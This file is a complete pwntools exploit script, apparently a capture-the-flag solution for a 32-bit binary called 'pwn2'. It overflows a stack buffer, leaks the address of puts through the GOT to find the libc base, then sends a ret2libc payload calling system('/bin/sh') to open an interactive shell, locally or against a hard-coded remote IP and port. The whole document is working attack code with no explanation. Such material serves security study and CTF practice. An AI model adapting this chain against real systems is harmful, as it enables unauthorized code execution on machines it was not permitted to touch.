from pwn import *
import sys

context.binary = "./pwn2"

binary = ELF("./pwn2", checksec = False)

def exploit(target, libc):
    padding = 44
    puts_plt = binary.symbols["plt.puts"]
    log.info("Puts@plt: {}".format(hex(puts_plt)))
    puts_got = binary.symbols["got.puts"]
    log.info("Puts@got: {}".format(hex(puts_got)))
    main_addr = binary.symbols["main"]
    log.info("Main addr: {}".format(hex(main_addr)))

    # gdb.attach(p, gdbscript = """
    #                           b*main+139
    #                           c
    #                           """)
    
    payload = ""
    payload += "A" * padding
    payload += p32(puts_plt)
    payload += p32(main_addr)
    payload += p32(puts_got)
    p.sendline(payload)

    p.recvuntil("Bye!\n")
    libc_leak = u32(p.recv(4))
    log.info("Libc leak: {}".format(hex(libc_leak)))
    libc_base = libc_leak - libc.symbols["puts"]
    log.info("Libc base: {}".format(hex(libc_base)))
    system_libc = libc_base + libc.symbols["system"]
    log.info("System@libc: {}".format(hex(system_libc)))
    binsh_libc = libc_base + libc.search("/bin/sh").next()
    log.info("Binsh@libc: {}".format(hex(binsh_libc)))

    payload = ""
    payload += "A" * (padding - 8)
    payload += p32(system_libc)
    payload += "JUNK"
    payload += p32(binsh_libc)
    p.sendline(payload)
    sleep(1)
    p.interactive()

if __name__ == "__main__":
    if len(sys.argv) < 2:
        log.info("Argument needed!")
        log.info("Usage: python {} <local/remote>".format(sys.argv[0]))
    elif sys.argv[1] == "local":
        libc = ELF("/lib/i386-linux-gnu/libc.so.6", checksec = False)
        p = process("./pwn2")
        exploit(p, libc)
    elif sys.argv[1] == "remote":
        libc = ELF("./libc6_2.19-0ubuntu6.14_i386.so", checksec = False)
        p = remote("104.154.106.182", 3456)
        exploit(p, libc)
    else:
        sys.exit(0)
